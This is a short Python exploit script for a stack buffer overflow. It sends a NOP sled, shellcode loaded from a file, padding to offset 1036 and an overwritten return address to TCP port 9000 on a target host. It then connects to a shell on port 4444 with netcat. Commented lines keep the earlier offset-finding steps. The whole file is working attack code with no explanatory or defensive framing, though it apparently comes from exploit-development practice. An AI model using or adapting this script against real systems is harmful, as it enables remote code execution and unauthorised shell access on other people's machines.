#!/usr/bin/python

import socket
import sys
import os

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

cyclic_file = open('pattern.txt','rb')
cyclic_str = cyclic_file.read()
cyclic_file.close()

shellfile = open('shellcode.bin','rb')
shellcode = shellfile.read()
shellfile.close()

redEIP = b'\x64\xf7\x22\x00' #0022F764 

#buffer = bytes(cyclic_str)

#buffer = b'A'*1036+redEIP+b'C'*(2036-1036-4)

buffer = b'\x90'*36+shellcode+b'\x90'*(1036-len(shellcode)-36) + redEIP + b'C'*2000

if __name__ == '__main__':
	sock.connect((sys.argv[1],9000))
	print('sending buffer {}'.format(buffer[0:10]))
	sock.send(buffer)
	sock.close()
	print('done!')
	cmd4shell = 'nc -nv '+sys.argv[1] +' 4444'
	os.system(cmd4shell)
